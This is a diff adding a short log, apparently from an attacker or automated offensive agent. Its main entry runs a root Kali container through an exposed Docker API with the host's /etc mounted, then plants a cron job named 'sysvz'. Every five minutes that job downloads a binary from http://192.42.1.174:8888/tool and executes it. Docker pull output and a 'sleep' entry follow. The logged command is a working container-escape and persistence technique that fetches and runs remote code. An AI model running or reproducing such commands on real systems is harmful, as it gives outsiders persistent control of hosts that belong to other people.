@@ -1,0 +1,15 @@
+--- 2026-01-21 10:37:54 INFO: ---
+
+Command: docker -H tcp://localhost:1090 run --rm -t -u root --network=nextcloud_default -v /etc:/root/etc  kalilinux/kali-rolling bash -c "echo \"*/5 * * * * root test -e /opt/tool || curl http://192.42.1.174:8888/tool > /opt/tool && chmod +x /opt/tool && /opt/tool\" > /root/etc/cron.d/sysvz"
+Unable to find image 'kalilinux/kali-rolling:latest' locally
+latest: Pulling from kalilinux/kali-rolling
+e92b9ba620f5: Pulling fs layer
+e92b9ba620f5: Download complete
+e92b9ba620f5: Pull complete
+Digest: sha256:3b5099ef6913d0fc230dc4e7532bedbea0a5ac44703d03eb4a67ff9cd2d13b73
+Status: Downloaded newer image for kalilinux/kali-rolling:latest
+
+--- 2026-01-21 10:43:54 INFO: ---
+
+Command: sleep
+Awake O_O
